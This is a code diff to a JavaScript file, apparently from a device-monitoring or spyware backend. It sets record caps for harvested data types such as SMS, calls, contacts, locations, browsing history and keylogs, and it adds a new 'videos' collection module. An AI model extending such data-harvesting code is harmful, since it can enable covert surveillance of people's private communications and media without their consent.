@@ -152,7 +152,7 @@ const MODULE_CAPS = {
   sms: 1000, calls: 1000, contacts: 2000, locations: 1000,
   browsing: 1000, media: 1000, apps: 500, device: 20,
   network: 100, notifications: 300, keylog: 500, events: 300,
-  photos: 60, audio: 12
+  photos: 60, audio: 12, videos: 12
 }
 
 const TYPE_TO_MODULE = {
@@ -172,7 +172,8 @@ const TYPE_TO_MODULE = {
   window_change: 'events',
   focus: 'events',
   photo_file: 'photos',
-  audio_file: 'audio'
+  audio_file: 'audio',
+  video_file: 'videos'
 }
 
 const hashString = (s) => crypto.createHash('sha1').update(String(s)).digest('hex')
